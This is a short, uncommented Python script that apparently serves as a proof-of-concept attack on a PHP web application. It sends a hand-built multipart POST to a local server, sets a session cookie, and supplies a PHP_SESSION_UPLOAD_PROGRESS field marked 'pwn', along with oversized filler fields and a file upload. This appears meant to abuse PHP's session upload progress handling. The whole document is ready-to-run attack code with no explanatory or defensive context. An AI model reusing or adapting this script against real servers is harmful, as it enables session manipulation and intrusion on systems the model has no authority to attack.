#!/usr/bin/env python3
import socket
HOST='127.0.0.1'; PORT=8088; SID=b'bgsmall123'; BND=b'BNDRY12345'
def mp(parts,b):
    o=bytearray()
    for p in parts:
        o+=b'--'+b+b'\r\n'
        if 'filename' in p:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
        else:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
        o+=p['data']+b'\r\n'
    o+=b'--'+b+b'--\r\n'; return bytes(o)
p1=bytearray(b'A'*8214); p2=bytearray(b'B'*8214); p1[0:8]=b'\x41'*8; p2[0:8]=b'\x42'*8
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
       {'name':'p1','data':bytes(p1)},{'name':'p2','data':bytes(p2)},
       {'name':'f','filename':'a.bin','data':b'Z'*64}]
body=mp(parts,BND)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nCookie: PHPSESSID={SID.decode()}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=30); s.settimeout(30)
try: s.sendall(h+body)
except OSError as e: print('send err',e)
d=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        d+=c
except OSError as e: print('recv err',e)
s.close()
print(d[:300].decode('latin1','replace'))
